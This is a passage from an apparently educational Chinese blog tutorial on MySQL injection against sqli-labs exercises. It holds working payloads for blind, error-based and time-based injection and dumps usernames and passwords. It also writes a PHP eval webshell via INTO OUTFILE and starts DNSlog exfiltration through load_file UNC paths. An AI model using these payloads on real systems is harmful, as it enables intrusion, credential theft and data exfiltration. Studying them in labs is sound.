class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">▲regexp 正则注入<br>用法介绍：<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^[a-z]&#x27;</span>;<br>正则表达式的用法，<span class="hljs-keyword">user</span>()结果为 root，regexp 为匹配 root 的正则表达式。<br>第二位可以用 <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^ro&#x27;</span>来进行。<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(if((<span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^r&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">user</span>() regexp<span class="hljs-string">&#x27;^ri&#x27;</span>);<br><br>通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等<br>于 <span class="hljs-number">0</span> 或者 <span class="hljs-number">1</span> 进行判断。<br></code></pre></td></tr></table></figure><p>like 匹配注入</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。<br>用法：<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> ‘ro%’<br></code></pre></td></tr></table></figure><p>总结：布尔盲注即用二分法，通过页面的真假判断数字的大小，推断出对应的字母，进一步拼凑出所有的字符串，从而得出想要获得的信息</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>当页面没有正常回显但是有报错就可使用报错注入</p><p><img src="/../image/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5.png"></p><h4 id="extractValue-报错注入"><a href="#extractValue-报错注入" class="headerlink" title="extractValue()报错注入"></a>extractValue()报错注入</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">函数<span class="hljs-built_in">extractValue</span>()包含两个参数<br>第一个参数 XML文档对象名称，第二个参数 路径<br></code></pre></td></tr></table></figure><p><img src="/../image/extractvalue.png"></p><p>目的：用extractvalue报错回显出我们想要的查询结果</p><p>例子：</p><p>利用extractvalue报错注入 less5</p><p><img src="/../image/extractvalue2.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">使用extractvalue报错注入得到库名<br>?<span class="hljs-attribute">id</span>=100&#x27; union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+<br><br>0x7e即<span class="hljs-string">&#x27;~&#x27;</span>符号<br>在使用extracvalue函数是第一个参数可以任意填入，不影响<br>查表 查列 查内容与查库类似<br><br>查表<br>?<span class="hljs-attribute">id</span>=100&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()))) --+<br><br>查列<br>?<span class="hljs-attribute">id</span>=100&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))) --+<br><br>查数据<br>如果不知道列数也可用 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=xxx<br>?<span class="hljs-attribute">id</span>=100&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=extractvalue(1,concat(0x7e,(select group_concat(username,<span class="hljs-string">&#x27;~&#x27;</span>,password) <span class="hljs-keyword">from</span> users))) --+<br>默认只能返回32个字符串<br></code></pre></td></tr></table></figure><p>查表查数据：</p><p><img src="/../image/extractvalue3.png"></p><p>使用函数substring解决只能返回32个字符串问题</p><p><img src="/../image/extractvalue4.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">substring</span><span class="hljs-params">()</span></span>第一个参数为目标字符串，第二个参数为从哪个位置开始，第三个参数为显示字符数<br>同substr<br></code></pre></td></tr></table></figure><h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><p>updatexml函数</p><p><img src="/../image/updatexml.png"></p><p>例子：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(&#x27;~&#x27;,(select database())),3) --+<br><br>查表名、列名、内容与union注入相似<br></code></pre></td></tr></table></figure><p><img src="/../image/updatexml2.png"></p><h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p>涉及到的函数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">rand</span><span class="hljs-params">()</span></span>函数：随机返回<span class="hljs-number">0</span>~<span class="hljs-number">1</span>间的小数<br><br><span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">()</span></span>函数：小数向下取整数。向上取整数 <span class="hljs-built_in">ceiling</span>()<br><br><span class="hljs-function"><span class="hljs-title">concat_ws</span><span class="hljs-params">()</span></span>函数：将括号内数据用第一个字段连接起来<br><br>group by子句：分组语句，常用于，结合统计函数，根据一个或多个列，对结果集进行分组<br><br>as：别名<br><br><span class="hljs-function"><span class="hljs-title">count</span><span class="hljs-params">()</span></span>函数：汇总统计数量<br><br>limit：这里用于显示指定行数<br></code></pre></td></tr></table></figure><p>完整的一段floor报错注入例子：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&#x27; union <span class="hljs-keyword">select</span>,<span class="hljs-built_in">count</span>(*),concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;~&#x27;</span>,id,username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a --+<br></code></pre></td></tr></table></figure><hr><p>floor报错分解：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rand()<br><span class="hljs-keyword">select</span> rand() <span class="hljs-keyword">from</span> users;根据表users的行数随机显示结果<br><br>floor()<br><span class="hljs-keyword">select</span> floor(rand()*<span class="hljs-number">2</span>);结果随机为<span class="hljs-number">0</span>或者<span class="hljs-number">1</span><br><br>concat_ws()<br><span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),floor(rand()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">from</span> users;将括号内数据用<span class="hljs-string">&#x27;-&#x27;</span>连接起来<br><br><span class="hljs-keyword">as</span>,<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>分组<br><span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),floor(rand()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br><br>count()汇总<br><span class="hljs-keyword">select</span> count(*),concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),floor(rand()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br></code></pre></td></tr></table></figure><p>报错：</p><p><img src="/../image/floor%E6%8A%A5%E9%94%99.png"></p><p>报错原理分析：</p><p><img src="/../image/floor%E6%8A%A5%E9%94%99%E5%88%86%E6%9E%90.png"></p><p>例子：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs q">查看版本号<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat_ws(&#x27;-&#x27;,(<span class="hljs-keyword">select</span> version()),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) as x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x --+<br><br><br>如果要查看库名，表名，列名与<span class="hljs-built_in">union</span>注入相似,只需修改加粗位置语句即可<br>比如：<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat_ws(&#x27;-&#x27;,(<span class="hljs-keyword">select</span> group_concat(username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) as x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x --+<br><br><br><br>如果使用group_concat()不显示可以使用concat，然后使用limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>控制显示<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat_ws(&#x27;-&#x27;,(<span class="hljs-keyword">select</span> concat(&#x27;~&#x27;,username,&#x27;:&#x27;,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) as x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x --+<br><br><br><br>注意：<br><span class="hljs-number">1.</span>information_schema.<span class="hljs-built_in">tables</span>跟查询表名没有关系，使用它只是因为数据需要足够多来产生报错<br><span class="hljs-number">2.</span><span class="hljs-built_in">rand</span>()里面参数填入<span class="hljs-number">0</span>必然会产生报错<br><span class="hljs-number">3.</span>使用as取别名使代码更方便<br></code></pre></td></tr></table></figure><p>注意：floor报错的好处是能显示64位字符，比上面两种报错多显示一倍</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>关键函数：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>()通过<span class="hljs-title"><span class="hljs-built_in">sleep</span></span>()函数往里面添加参数，从而影响网页的响应时间来判断闭合方式，或者判断是否成功注入</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A81.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(<span class="hljs-keyword">condition</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>)<span class="hljs-keyword">condition</span>为条件，<span class="hljs-literal">true</span>当条件为真时返回的值，<span class="hljs-literal">false</span>当条件为假时返回的值<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A82.png"></p><p>查看网页响应时间的长短：</p><p><img src="/../image/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A83.png"></p><p>具体例子：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">时间盲注需要结合布尔盲注ascii相关知识，通过网页响应时间来猜库名每一位的字母<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">0</span>),sleep(<span class="hljs-number">3</span>));<br><br>更改substr参数推算第二个字母，并以此推算出剩余字母，直到得出结果<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">0</span>),sleep(<span class="hljs-number">3</span>));<br><br>替换入需要查询的命令语句<br>查表名<br>?id=1&#x27; and if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">0</span>),sleep(<span class="hljs-number">3</span>))<br><br>查列名，内容方法类似<br></code></pre></td></tr></table></figure><p>可直接and + if语句</p><p><img src="/../image/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A84.png"></p><p>时间盲注的闭合符的判断</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">哪种响应时间符合休眠时间就是哪种闭合<br>?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> sleep(3)--+<br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> sleep(3)--+<br>?<span class="hljs-attribute">id</span>=1&#x27;) <span class="hljs-keyword">and</span> sleep(3)--+<br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> sleep(3)--+<br>?<span class="hljs-attribute">id</span>=1&quot;) <span class="hljs-keyword">and</span> sleep(3)--+<br></code></pre></td></tr></table></figure><h2 id="Sql注入文件上传"><a href="#Sql注入文件上传" class="headerlink" title="Sql注入文件上传"></a>Sql注入文件上传</h2><p>文件上传要点：<br><img src="/../image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A6%81%E7%82%B9.png"></p><ul><li>secure-file-priv的值有三种情况：</li><li>secure_file_prive&#x3D;null —限制mysqld 不允许导入导出</li><li>secure_file_priv&#x3D;&#x2F;path&#x2F; —限制mysqld的导入导出只能发生在默认的&#x2F;path&#x2F;目录下</li><li>secure_file_priv&#x3D;’ ‘ —不对mysqld 的导入 导出做限制</li></ul><p>通过注入点写入木马程序的前提条件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1、mysql开启了<span class="hljs-attribute">secure_file_priv</span>=<span class="hljs-string">&quot;&quot;</span>的配置<br>2、知道了网站代码的真实物理路径<br>3、物理路径具备写入权限<br>4、最好是root用户，这个条件非必须，但是有最好<br></code></pre></td></tr></table></figure><p>获得后台真实物理路径的方法：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">1</span>、收集站点敏感目录，比如phpinfo.php探针文件是否可以访问到<br><span class="hljs-number">2</span>、站点网址输入一些不存在的网址或者加一些非法参数数据，让数据报错，看错误信息中是否存在路径信息<br><span class="hljs-number">3</span>、指纹信息收集<br>nginx默认站点目录<span class="hljs-symbol">:/usr/share/nginx/html</span>，配置文件路径<span class="hljs-symbol">:/etc/nginx/nginx</span>.conf<br>apache默认站点目录<span class="hljs-symbol">:/var/www/html</span><br><span class="hljs-number">4</span>、通过站点其他漏洞来获取配置信息、真实物理路径信息，比如如果发现远程命令执行漏洞，针对php的站点，直接执行一个phpinfo()函数，可以看到phpinfo.php所展示的各种信息。<br><span class="hljs-number">5</span>、其他思路，反正就是不断地尝试<br></code></pre></td></tr></table></figure><p>文件上传指令：</p><p><img src="/../image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%8C%87%E4%BB%A4.png"></p><p>内置相关函数</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less">@<span class="hljs-variable">@basedir</span><span class="hljs-variable">@@basedir</span>在MySQL中表示MySQL的安装路径,通过执行SQL命令SELECT <span class="hljs-variable">@@basedir</span>;，可以获取<span class="hljs-selector-tag">MySQL</span>的安装路径<br><br>@@<span class="hljs-selector-tag">datadir</span>  构造<span class="hljs-selector-tag">SQL</span>语句：<span class="hljs-selector-tag">select</span> @@<span class="hljs-selector-tag">datadir</span>,作用：返回数据的存储目录<br></code></pre></td></tr></table></figure><p>注意：into outfile后的路径必须使用双反斜杠\\分隔</p><hr><p>成功上传一句话木马后可用蚁剑连接</p><p>例如sqli第七关</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1&#x27;)) union select 1,2,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mixbp&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; into outfile &quot;E:\\CTF\\phpstudy\\phpstudy_pro\\WWW\\pwd.php&quot; --+</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.png"></p><p>添加成功</p><p>连接之后就相当于控制这台电脑了</p><p><img src="/../image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.png"></p><h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><p>要求：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">secure_file_priv=<span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-comment">---不对mysqld 的导入 导出做限制</span><br>数据库读取权限<br></code></pre></td></tr></table></figure><p>常用函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">load_file</span><span class="hljs-params">(<span class="hljs-string">&quot;文件路径&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,load_file(<span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>phpStudy<span class="hljs-subst">\\</span>PHPTutorial<span class="hljs-subst">\\</span>WWW<span class="hljs-subst">\\</span>xx.txt&quot;</span>)#<br><br>注意：load_file函数里的文件路径分隔要用\\<br>用联合查询时注意列数和前面相同<br></code></pre></td></tr></table></figure><h3 id="增删改查注入"><a href="#增删改查注入" class="headerlink" title="增删改查注入"></a>增删改查注入</h3><p>其实就是通过抓包后使用报错注入，这里就略过了</p><p><strong>增加</strong></p><p>1.Insert</p><p>简单举例</p><p>insert into users values(‘16’,’lcamry’,’lcamry’);</p><p><strong>删除</strong></p><p>2.删数据:</p><p>delete from 表名;</p><p>delete from 表名 where id&#x3D;1; </p><p>删除结构：</p><p>删数据库：drop database 数据库名;</p><p>删除表：drop table 表名;</p><p>删除表中的列:alter table 表名 drop column 列名;</p><p>简单举例：</p><p>delete from users where id&#x3D;16</p><p><strong>修改</strong></p><p>修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ; </p><p>带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6;</p><p>update users set username&#x3D;’tt’ where id&#x3D;15</p><p>爆库</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> database())),<span class="hljs-number">3</span>) <span class="hljs-keyword">or</span>&#x27;<br></code></pre></td></tr></table></figure><p>update&#x2F;insert注入</p><p><img src="/../image/%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%B3%A8%E5%85%A5.png"></p><p>爆表，内容操作相似</p><p>delete注入</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">or updatexml(<span class="hljs-number">2</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">database</span>())),<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p><img src="/../image/delete%E6%B3%A8%E5%85%A5.png"></p><p>注意：在注入后必须把特殊符号转换成url形式</p><h3 id="http请求头注入"><a href="#http请求头注入" class="headerlink" title="http请求头注入"></a>http请求头注入</h3><p>其实就是抓包后在请求头中插入报错注入</p><p>php专门取请求头数据，使用的方法是$_SERVER[“请求头键”]就能拿到值</p><p><img src="/../image/%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">源码例子<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-string">&#x27;security&#x27;</span>.<span class="hljs-string">&#x27;uagents&#x27;</span> (<span class="hljs-string">&#x27;uagent&#x27;</span>,<span class="hljs-string">&#x27;ip_address&#x27;</span>,<span class="hljs-string">&#x27;username&#x27;</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;$uagent&#x27;</span>,<span class="hljs-string">&#x27;$IP&#x27;</span>,$uname);<br><br>第一种方法<br><span class="hljs-string">&#x27;or updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select database())),3) or&#x27;</span><br>注入关键<br>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">3</span>) <span class="hljs-keyword">or</span><span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$IP,&#x27;</span>$unam<span class="hljs-string">e&#x27;)</span><br><span class="hljs-string">另一种方法</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">3</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)#也可<br></code></pre></td></tr></table></figure><p>只要服务端取出了相应的请求头数据和数据库有联系就可以注入</p><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>load_file()函数读取指定路径文件</p><p>例如：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">load_file</span>(<span class="hljs-params"><span class="hljs-string">&quot;C:\\benben.txt&quot;</span></span>)</span>;<br>不仅可以读取本机也可以读取网络上的文件<br></code></pre></td></tr></table></figure><p>UNC路径</p><p>‌**<a href="https://www.baidu.com/s?wd=UNC%E8%B7%AF%E5%BE%84&usm=3&ie=utf-8&rsv_pq=d0bbe5b701514305&oq=UNC%E8%B7%AF%E5%BE%84&rsv_t=0606yqX9OxjLQIUiIKkd8siq5VQfZtUoG9/OBbU9/PbY2EZS8yZgpvDFpLw&rsv_dl=re_dqa_generate&sa=re_dqa_generate">UNC路径</a>（Universal Naming Convention）是一种在<a href="https://www.baidu.com/s?wd=Windows%E7%BD%91%E7%BB%9C&usm=3&ie=utf-8&rsv_pq=d0bbe5b701514305&oq=UNC%E8%B7%AF%E5%BE%84&rsv_t=26750xLLRlhGqSL0u8cn7DxfItDAmPP2W20SDOgOFhZZP7sLRYOaFJ4R3wo&rsv_dl=re_dqa_generate&sa=re_dqa_generate">Windows网络</a>中表示共享文件和资源的标准化方法**‌。UNC路径通常以两个反斜杠（\）开头，后面跟着服务器名称和共享资源名称。例如，一个典型的UNC路径格式为<code>\\ServerName\ShareName\File.txt</code>，其中<code>ServerName</code>是服务器名称，<code>ShareName</code>是共享资源的名称，<code>File.txt</code>是文件名称。‌</p><p>例如：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">load_file</span>(<span class="hljs-params"><span class="hljs-string">&quot;//192.168.1.209/123/benben.txt&quot;</span></span>)</span>;<br></code></pre></td></tr></table></figure><p>servername可以是域名也可以是ip，常用的就是域名</p><p>需要用到的网站：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//ceye.io</span><br>常用：http:<span class="hljs-comment">//www.dnslog.cn/</span><br></code></pre></td></tr></table></figure><p>手动注入：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">获得库名<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> load_file(concat(&quot;//&quot;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),&quot;.域名/任意文件&quot;))) <span class="hljs-comment">--+</span><br><br>获得表名<br><span 